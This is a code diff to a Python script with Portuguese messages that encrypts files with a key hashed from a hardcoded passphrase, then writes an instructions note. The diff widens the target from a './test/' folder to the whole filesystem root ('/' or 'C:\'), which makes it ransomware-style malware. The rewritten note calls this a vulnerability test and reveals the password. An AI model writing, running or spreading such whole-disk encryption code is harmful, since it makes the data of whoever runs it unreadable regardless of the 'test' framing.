@@ -16,24 +16,25 @@ def ask_for_key():
     return key
 
 if __name__ == "__main__":
-    key = hashlib.sha256("cuidadocomosemail".encode()).digest()
+    key = hashlib.sha256("sistemavulneravel".encode()).digest()
 
-    directory = "./test/" if os.name != "nt" else "C:\\"
+    directory = "/" if os.name != "nt" else "C:\\"
     scan_and_encrypt(directory, key)
 
     print(
             "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
             )
 
-    file_name = "novo_arquivo.txt"
+    file_name = "/instrucoes.txt" if os.name != "nt" else "C:\\instrucoes.txt"
 
     try:
         # Usando o modo 'x' para criar o arquivo (gera erro se o arquivo já existir)
         with open(file_name, 'x') as file:
-            file.write("Instrucoes: .\n")
-            file.write("Na verdade nao tem muitas, apenas aguarde, nao precisa de panico .\n")
-            file.write("Nao queremos dinheiro, queremos so tempo.\n")
-            file.write("So aguarda, a senha chegara para voces.\n")
+            file.write("""
+                Não fique em panico, vai da tudo certo. Isso foi apenas um teste de vulnerabilidade,
+                a senha e essa: 'sistemavulneravel'.
+                Tome cuidado. Melhor investir um pouco mais na segunrança
+            """)
     except FileExistsError:
         print(f"Erro: O arquivo '{file_name}' já existe.")
 
